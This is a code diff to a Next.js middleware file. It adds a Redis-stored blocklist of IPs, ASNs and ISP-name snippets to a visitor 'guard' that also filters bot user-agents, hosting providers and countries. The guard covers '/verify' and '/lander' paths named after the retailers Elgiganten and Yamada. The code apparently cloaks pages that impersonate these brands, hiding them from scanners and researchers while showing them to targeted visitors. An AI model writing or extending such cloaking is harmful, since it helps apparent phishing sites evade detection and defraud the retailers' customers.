@@ -1,9 +1,47 @@
 // middleware.ts
 import { NextResponse, NextRequest } from "next/server";
+import { Redis } from "@upstash/redis";
 
 export const config = {
   matcher: ["/elgiganten/verify/:path*", "/yamada", "/yamada/verify/:path*", "/yamada/lander/:path*"],
 };
+
+/* ========= Dynamic blocklist cache ========= */
+interface DynamicLists {
+  ips: Set<string>;
+  asns: Set<string>;
+  snippets: string[];
+}
+let _dynCache: DynamicLists | null = null;
+let _dynCacheAt = 0;
+const DYN_TTL = 60_000;
+
+async function getDynamicLists(): Promise<DynamicLists> {
+  if (_dynCache && Date.now() - _dynCacheAt < DYN_TTL) return _dynCache;
+  if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
+    return _dynCache ?? { ips: new Set(), asns: new Set(), snippets: [] };
+  }
+  try {
+    const redis = new Redis({
+      url: process.env.UPSTASH_REDIS_REST_URL,
+      token: process.env.UPSTASH_REDIS_REST_TOKEN,
+    });
+    const [ips, asns, snippets] = await Promise.all([
+      redis.smembers("shield_dynamic_ips"),
+      redis.smembers("shield_dynamic_asns"),
+      redis.smembers("shield_dynamic_snippets"),
+    ]);
+    _dynCache = {
+      ips: new Set(ips as string[]),
+      asns: new Set((asns as string[]).map((s) => s.toUpperCase())),
+      snippets: (snippets as string[]).map((s) => s.toLowerCase()),
+    };
+    _dynCacheAt = Date.now();
+    return _dynCache;
+  } catch {
+    return _dynCache ?? { ips: new Set(), asns: new Set(), snippets: [] };
+  }
+}
 
 /* ========= RUNTIME CONFIG / LOGGING ========= */
 function getRedirectUrl(pathname: string): string {
@@ -385,6 +423,7 @@ interface GuardResult {
 async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResult> {
   const ua = req.headers.get("user-agent") || "";
   const checks: Record<string, string> = {};
+  const dyn = await getDynamicLists();
 
   // 1. Bot UA
   const botMatch = BOT_UA.test(ua);
@@ -433,6 +472,14 @@ async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResul
     return { blocked: true, reason: "cidr", checks };
   }
 
+  // 3.5. Dynamic IP check (saves IPinfo call for already-known bad IPs)
+  if (dyn.ips.has(ip)) {
+    checks["dynamic"] = "BLOCKED (ip)";
+    log("Guard: block by dynamic IP:", ip);
+    return { blocked: true, reason: "dynamic_ip", checks };
+  }
+  checks["dynamic"] = "pass"; // will be overwritten if ASN/snippet blocks later
+
   // 4. IPinfo
   const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
   checks["ipinfo"] = lite ? "fetched" : "failed/skipped";
@@ -442,7 +489,7 @@ async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResul
   const countryCode = (lite as any)?.country_code || "";
   const country = lite?.country || "";
 
-  // 5. Provider / ASN
+  // 5. Provider / ASN (static)
   const providerResult = matchesBadProviderLite(lite);
   checks["provider"] = providerResult.blocked ? `BLOCKED (${providerResult.type}: ${providerResult.match})` : "pass";
   if (providerResult.blocked) {
@@ -451,6 +498,19 @@ async function runGuard(req: NextRequest, ip: string | null): Promise<GuardResul
       : `bad_name_snippet:${providerResult.match}`;
     log("Guard: block by provider —", reason);
     return { blocked: true, reason, checks, asn, isp: ispName, countryCode, country };
+  }
+
+  // 5.5. Dynamic ASN / snippet check
+  if (asn && dyn.asns.has(asn.toUpperCase())) {
+    checks["dynamic"] = `BLOCKED (asn: ${asn})`;
+    log("Guard: block by dynamic ASN:", asn);
+    return { blocked: true, reason: `dynamic_asn:${asn}`, checks, asn, isp: ispName, countryCode, country };
+  }
+  const dynSnippet = dyn.snippets.find((s) => ispName.toLowerCase().includes(s));
+  if (dynSnippet) {
+    checks["dynamic"] = `BLOCKED (snippet: ${dynSnippet})`;
+    log("Guard: block by dynamic snippet:", dynSnippet);
+    return { blocked: true, reason: `dynamic_snippet:${dynSnippet}`, checks, asn, isp: ispName, countryCode, country };
   }
 
   // 6. Country
